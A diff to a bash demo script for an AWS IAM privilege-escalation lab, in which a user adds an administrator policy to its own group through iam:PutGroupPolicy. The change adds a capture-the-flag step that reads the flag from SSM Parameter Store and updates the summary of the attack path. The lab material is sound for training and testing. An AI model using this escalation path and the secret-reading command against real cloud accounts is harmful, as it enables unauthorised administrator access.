@@ -39,9 +39,6 @@ PRIVESC_USER="pl-prod-iam-011-to-admin-paul"
 TARGET_GROUP="pl-prod-iam-011-to-admin-escalation-group"
 POLICY_NAME="EscalatedAdminAccess"
 
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
-
 echo -e "${GREEN}========================================${NC}"
 echo -e "${GREEN}IAM PutGroupPolicy Self-Escalation Demo${NC}"
 echo -e "${GREEN}========================================${NC}"
@@ -225,14 +222,33 @@ if [ "$SUCCESS" = false ]; then
     echo "The privilege escalation was successful - permissions may take a moment to fully propagate."
 fi
 
+# [EXPLOIT] Step 7: Capture the CTF flag
+echo -e "${YELLOW}Step 7: Capturing the CTF flag${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
+
+show_attack_cmd "Attacker" "aws ssm get-parameter --name /pathfinding-labs/flags/iam-011-to-admin --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name /pathfinding-labs/flags/iam-011-to-admin --query 'Parameter.Value' --output text)
+
+if [ -z "$FLAG_VALUE" ]; then
+    echo -e "${RED}Error: Could not retrieve CTF flag. Ensure the escalation is complete and IAM has propagated.${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}✓ CTF flag captured: $FLAG_VALUE${NC}\n"
+
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 # Summary
 echo -e "${GREEN}========================================${NC}"
-echo -e "${GREEN}✅ SELF-ESCALATION SUCCESSFUL!${NC}"
+echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo -e "\n${YELLOW}Summary:${NC}"
 echo "1. Started as: $PRIVESC_USER (member of $TARGET_GROUP)"
 echo "2. Used PutGroupPolicy to add admin policy to own group"
 echo "3. $PRIVESC_USER now has administrator access via group membership"
+echo "4. Captured CTF flag: $FLAG_VALUE"
 echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $PRIVESC_USER (member of $TARGET_GROUP)"
@@ -240,6 +256,8 @@ echo -e "    ↓ (iam:PutGroupPolicy)"
 echo -e "  Adds admin policy to $TARGET_GROUP"
 echo -e "    ↓ (group membership)"
 echo -e "  $PRIVESC_USER gains Administrator Access"
+echo -e "    ↓ (ssm:GetParameter)"
+echo -e "  CTF Flag"
 echo ""
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
